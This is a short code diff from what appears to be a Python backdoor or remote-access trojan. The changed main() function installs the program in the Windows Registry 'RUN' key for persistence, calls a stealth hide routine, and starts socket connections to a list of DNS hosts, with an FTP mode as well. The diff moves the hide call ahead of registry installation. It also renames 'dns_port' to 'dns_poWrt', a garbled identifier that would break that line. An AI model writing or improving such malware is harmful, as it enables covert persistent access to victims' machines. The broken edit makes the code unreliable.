@@ -246,8 +246,8 @@ def main():
 
 	#install on Registry "RUN"
 	if(debug_mode == False):
-		module.registry.install(p.name)
 		module.stealth.hide()
+		module.registry.install(p.name)
 
 
 	if(socketMode == True):
@@ -257,7 +257,7 @@ def main():
 				module.thread.start(module.socket.connect,(dns,p.dns_port))
 		else:
 			for dns in local_list:
-				module.thread.start(module.socket.connect,(dns,p.dns_port))
+				module.thread.start(module.socket.connect,(dns,p.dns_poWrt))
 
 	if(ftpMode == True):
 		#start FTP conn
